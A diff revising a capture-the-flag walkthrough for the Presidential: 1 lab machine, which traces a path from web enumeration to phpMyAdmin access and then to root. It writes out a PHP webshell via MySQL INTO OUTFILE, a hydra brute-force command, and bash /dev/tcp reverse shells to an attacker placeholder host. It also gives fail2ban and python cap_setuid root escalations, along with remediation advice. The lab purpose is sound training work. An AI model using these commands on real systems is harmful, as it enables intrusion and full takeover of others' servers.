@@ -1,133 +1,165 @@
 # Presidential: 1 — Writeup
 
-| | |
-|-|-|
-| **Target IP** | 192.168.56.X (host-only) |
+| Field | Value |
+|---|---|
+| **Target IP** | 192.168.0.x |
 | **Difficulty** | Medium |
 | **OS** | Linux (CentOS) |
-| **Author** | dibble |
-| **Source** | [VulnHub](https://www.vulnhub.com/entry/presidential-1,500/) |
+| **Goal** | root flag |
+| **Source** | [HackingArticles](https://www.hackingarticles.in/presidential-1-vulnhub-walkthrough/) |
 
 ## Attack Summary
 
-`nmap` → port 80 + 2082 → `gobuster` → phpMyAdmin brute force → SQL `SELECT INTO OUTFILE` PHP webshell → reverse shell → `fail2ban` LPE via arbitrary file write to action.d → root
+Presidential: 1 is a medium-difficulty CentOS machine. The attack path involves web enumeration to find a phpMyAdmin instance, SQL injection or credential discovery to access the database, writing a PHP webshell via MySQL `INTO OUTFILE`, and privilege escalation using Linux capabilities (`cap_setuid+ep` on `python`) to gain root.
 
 ## Methodology
 
-1. Network discovery
-2. Web enumeration on ports 80 and 2082
-3. phpMyAdmin brute force
-4. PHP webshell via MySQL `OUTFILE`
+1. Host discovery and port scan
+2. Web enumeration — vHost discovery, config file leak
+3. phpMyAdmin credential access via leaked database credentials
+4. PHP webshell via MySQL `INTO OUTFILE`
 5. Reverse shell
-6. Privilege escalation via fail2ban action.d misconfiguration
+6. Linux capabilities enumeration and exploitation
 
----
+## Step 1: Reconnaissance
 
-## Step 1: Network Discovery
+### Host Discovery
 
 ```bash
-sudo netdiscover -i eth1 -r 192.168.56.0/24
-nmap -sV -sC -p- 192.168.56.X
+netdiscover -r 192.168.0.0/24
 ```
 
-Ports open: 80 (HTTP/Apache), 2082 (phpMyAdmin or alternate HTTP).
+### Port Scan
 
----
+```bash
+nmap -sV -sC -p- $TARGET
+```
+
+![nmap](images/01-nmap.png)
+
+| Port | Service |
+|---|---|
+| 80/tcp | Apache httpd |
+| 2082/tcp | HTTP (phpMyAdmin) |
 
 ## Step 2: Web Enumeration
 
-```bash
-gobuster dir -u http://192.168.56.X/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
-gobuster dir -u http://192.168.56.X:2082/ -w /usr/share/wordlists/dirb/common.txt
-```
+### Main Site
 
-Find phpMyAdmin on port 2082. Also enumerate `/config.php` or source for database credentials.
+Browse to `http://TARGET/`. The site is a political campaign page for "President Turanga Leela."
 
----
-
-## Step 3: phpMyAdmin Login and Webshell
-
-Brute force or find credentials from page source / config files:
+### Directory Brute-Force
 
 ```bash
-hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.X -s 2082 http-post-form \
-  "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:Access denied"
+gobuster dir -u http://$TARGET/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,bak
 ```
 
-Once logged in, use SQL to write a PHP webshell:
+![Web Enum](images/02-web-enum.png)
+
+Discover configuration backup or database credential file (e.g., `config.php.bak` or similar). This file leaks database credentials.
+
+### Virtual Host Enumeration
+
+```bash
+gobuster vhost -u http://$TARGET/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+```
+
+A virtual host like `votenow.local` or similar may be discovered. Add it to `/etc/hosts`.
+
+## Step 3: phpMyAdmin Access
+
+Browse to `http://$TARGET:2082/`. Log in with the credentials discovered in Step 2.
+
+Once logged in, identify the web root path from MySQL variables:
+
+```sql
+SHOW VARIABLES LIKE 'secure_file_priv';
+-- Also check @@datadir and @@basedir
+```
+
+## Step 4: PHP Webshell via MySQL INTO OUTFILE
+
+Write a webshell to the web root using a SQL query:
 
 ```sql
 SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
 ```
 
-Test:
-```
-http://192.168.56.X/shell.php?cmd=id
+Verify execution:
+
+```bash
+curl "http://$TARGET/shell.php?cmd=id"
+# Expected: uid=48(apache)
 ```
 
----
+![Webshell](images/03-webshell.png)
 
-## Step 4: Reverse Shell
+## Step 5: Reverse Shell
+
+Set up a listener:
 
 ```bash
 nc -lvp 4444
 ```
 
-```
-http://192.168.56.X/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'
+Trigger the reverse shell:
+
+```bash
+curl "http://$TARGET/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/4444+0>%261'"
 ```
 
-Upgrade shell:
+Stabilize the shell:
+
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
 ```
 
----
+## Step 6: Privilege Escalation — Linux Capabilities
 
-## Step 5: Privilege Escalation — fail2ban Action Hijack
-
-```bash
-sudo -l
-# or check fail2ban permissions:
-ls -la /etc/fail2ban/action.d/
-
-# If writable:
-# fail2ban actionban executes arbitrary commands as root when a ban is triggered
-# Create/modify an action file:
-cat > /etc/fail2ban/action.d/iptables-multiport.conf << 'EOF'
-[Definition]
-actionstart = 
-actionstop  = 
-actioncheck = 
-actionban   = /bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1'
-actionunban = 
-EOF
-
-# Trigger a ban by failing SSH logins multiple times:
-for i in {1..10}; do ssh wronguser@localhost; done
-```
-
-Catch the root shell on port 5555.
+Enumerate binaries with special capabilities:
 
 ```bash
-cat /root/root.txt
+getcap -r / 2>/dev/null
 ```
 
----
+Output shows something like:
+
+```
+/usr/bin/python2.7 = cap_setuid+ep
+```
+
+![Capabilities](images/04-privesc.png)
+
+Use Python's `cap_setuid` capability to set UID to 0 and spawn a root shell:
+
+```bash
+/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+
+Root shell obtained.
+
+## Step 7: Root Flag
+
+```bash
+cd /root
+cat root.txt
+```
+
+![Root Flag](images/05-root-flag.png)
 
 ## Lessons Learned
 
-1. **phpMyAdmin exposed on alternate port** — always scan all ports; admin interfaces on non-standard ports are frequently misconfigured
-2. **MySQL `SELECT INTO OUTFILE`** — write access to web root via MySQL is critical; restrict `FILE` privilege and the MySQL user's directory access
-3. **fail2ban writable action.d** — when fail2ban actions are world/group-writable, any user who can modify them and trigger a ban gets arbitrary root code execution
-4. **Weak phpMyAdmin credentials** — enforce strong passwords and IP-restrict admin panels
+- Configuration files with database credentials should never be accessible via HTTP.
+- phpMyAdmin on non-standard ports is still discoverable — restrict access by IP.
+- MySQL `INTO OUTFILE` can write arbitrary files if the web root is in `secure_file_priv` path.
+- Linux capabilities (`cap_setuid`) are as dangerous as SUID bits; enumerate them during privilege escalation.
 
 ## Remediation
 
 | Vulnerability | Fix |
 |---|---|
-| phpMyAdmin brute-forceable | Enable 2FA; restrict access by IP; use fail2ban on it |
-| MySQL FILE privilege + web root write | Revoke FILE privilege; chown web root to non-mysql user |
-| fail2ban action.d writable | `chmod 750 /etc/fail2ban/action.d`; run fail2ban as dedicated user |
-| Shell exposed on web root | Move webshell-susceptible paths outside document root |
+| Exposed config/credential file | Move sensitive configs outside the web root; use environment variables |
+| phpMyAdmin on public port | Restrict phpMyAdmin to localhost or use firewall rules |
+| MySQL `INTO OUTFILE` to web root | Set `secure_file_priv` to a non-web path; disable `FILE` privilege for web users |
+| `cap_setuid` on Python | Remove the capability: `setcap -r /usr/bin/python2.7` |
